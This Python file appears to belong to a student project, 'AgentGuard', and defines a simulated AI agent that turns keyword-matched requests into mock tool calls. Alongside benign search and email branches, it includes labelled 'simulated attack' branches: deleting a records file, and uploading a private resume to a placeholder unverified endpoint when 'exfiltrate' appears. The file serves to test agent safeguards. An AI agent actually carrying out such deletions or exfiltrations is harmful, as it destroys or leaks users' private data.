"""
AgentGuard — Simulated Autonomous AI Agent
Defines AIAgent behavior for safe search, external email, and simulated attacks.
"""

from typing import Dict, Any


class AIAgent:
    def __init__(self, name: str = "Student Assistant"):
        self.name = name

    def decide_action(self, user_request: str) -> Dict[str, Any]:
        """
        Translates a natural language user request into a simulated tool invocation.
        """
        request = (user_request or "").lower().strip()

        # 1. Normal Information Retrieval
        if "search" in request and "attack" not in request:
            return {
                "action": "web_search",
                "parameters": {
                    "query": user_request
                }
            }

        # 2. Outbound Communication
        if "email" in request and "attack" not in request:
            return {
                "action": "send_email",
                "parameters": {
                    "recipient": "recruiter@university-partner.edu",
                    "subject": "Internship Application Inquiry",
                    "body": "Hello, I am writing to submit my application for the software engineering role."
                }
            }

        # 3. Simulated Attack / Compromised Instruction
        if "attack" in request or "delete" in request:
            return {
                "action": "delete_file",
                "parameters": {
                    "file": "important_file.pdf",
                    "directory": "/var/data/records"
                }
            }

        if "upload" in request or "exfiltrate" in request:
            return {
                "action": "upload_file",
                "parameters": {
                    "destination": "https://unverified-endpoint.example/drop",
                    "file": "private_resume.pdf"
                }
            }

        # Default fallback
        return {
            "action": "unknown",
            "parameters": {}
        }
